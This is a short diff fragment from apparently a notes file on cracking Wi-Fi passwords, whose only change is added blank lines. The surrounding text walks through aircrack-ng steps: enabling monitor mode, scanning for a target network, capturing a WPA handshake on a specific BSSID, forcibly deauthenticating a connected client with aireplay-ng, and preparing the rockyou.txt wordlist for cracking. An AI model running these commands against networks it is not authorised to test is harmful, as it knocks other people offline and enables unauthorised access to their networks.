@@ -38,15 +38,19 @@ to see the unencypt keys
 # Get handshake with aircrack-ng
 
 put your network device into monitor mode
+
 airmon-ng start wlan0
 
 listen for all nearby beacon frames to get target BSSID and channel
+
 airodump-ng mon0
 
 start listening for the handshake
+
 airodump-ng -c 6 — bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0
 
 optionally deauth a connected client to force a handshake
+
 aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
 
 # download rockyou.txt wordlist
